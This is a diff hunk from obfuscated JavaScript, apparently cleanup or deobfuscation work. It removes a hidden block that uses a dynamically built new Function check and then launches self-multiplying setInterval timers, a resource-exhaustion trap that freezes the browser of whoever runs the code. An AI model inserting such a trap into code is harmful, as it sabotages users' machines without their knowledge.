@@ -1324,20 +1324,6 @@
     return Math.log(a) / Math.ΔᐃⵠⲆΔⵠⵠΔⵠ;
   };
   const vo = 1344225;
-  const co = 1344225 .ⵠᐃⵠⵠⲆⵠᐃ;
-  const mo = `const ⵠⲆΔᐃⲆΔᐃ = (typeof ᐃΔΔΔ === "${co}") ? 1 : 0; return ⵠⲆΔᐃⲆΔᐃ;`;
-  if (new Function(`${function () {
-    1344225();
-    return `const ⵠⲆΔᐃⲆΔᐃ = (typeof ᐃΔΔΔ === "${co}") ? 1 : 0; return ⵠⲆΔᐃⲆΔᐃ;`;
-  }}const ⵠⲆΔᐃⲆΔᐃ = (typeof ᐃΔΔΔ === "${co}") ? 1 : 0; return ⵠⲆΔᐃⲆΔᐃ;`)(14524282, 10823968) === 1) {
-    const a = aj.setInterval;
-    const b = a;
-    const c = function () {
-      a(c, 6146);
-      b(c, 4497);
-    };
-    c();
-  }
   const po = 19;
   function Co(b, c, d, e, f) {
     const i = (8 << (b >> 16 & 255)) + (16 << (b & 255)) + (0 << (b >> 24 & 255)) + (24 << (b >> 8 & 255));
